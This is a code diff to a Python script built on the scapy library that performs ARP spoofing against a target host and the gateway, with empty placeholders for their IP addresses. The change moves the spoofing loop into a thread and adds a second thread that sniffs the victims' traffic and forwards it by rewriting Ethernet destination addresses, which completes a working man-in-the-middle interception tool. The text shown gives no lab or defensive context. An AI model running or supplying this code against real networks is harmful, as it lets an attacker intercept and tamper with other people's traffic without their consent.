@@ -1,5 +1,6 @@
 from time import sleep
 import scapy.all as scapy
+import threading
 
 gateway = ""
 target_ip = ""
@@ -14,23 +15,30 @@ def get_mac(ip):
         raise ValueError("unable to to find mac address")
 
 
-def forward(packet):
-    scapy.send(packet, verbose=0)
-    print(packet.summary())
-
-
 target_mac = get_mac(target_ip)
 gateway_mac = get_mac(gateway)
 
-print(target_mac)
-print(gateway_mac)
+mac_dic = {target_mac: gateway_mac, gateway_mac: target_mac}
 
 
-while True:
-    scapy.send(scapy.ARP(op='is-at', psrc=gateway,
-                         pdst=target_ip, hwdst=target_mac), verbose=0)
-    scapy.send(scapy.ARP(op='is-at', psrc=target_ip,
-                         pdst=gateway, hwdst=gateway_mac), verbose=0)
-    sleep(1.5)
-    scapy.sniff(filter=f"host {target_ip}",
-                prn=lambda x: scapy.send(x), count=1)
+def forward(packet):
+    packet[scapy.Ether].dst = mac_dic.get(packet[scapy.Ether].src)
+    scapy.sendp(packet, verbose=0)
+
+
+def arp():
+    while True:
+        scapy.send(scapy.ARP(op='is-at', psrc=gateway,
+                             pdst=target_ip, hwdst=target_mac), verbose=0)
+        scapy.send(scapy.ARP(op='is-at', psrc=target_ip,
+                             pdst=gateway, hwdst=gateway_mac), verbose=0)
+        sleep(2)
+
+
+def sniff_thread():
+    scapy.sniff(
+        filter=f"ip and (ether src {target_mac} or ether src {gateway_mac})", prn=forward)
+
+
+threading.Thread(target=arp).start()
+threading.Thread(target=sniff_thread).start()
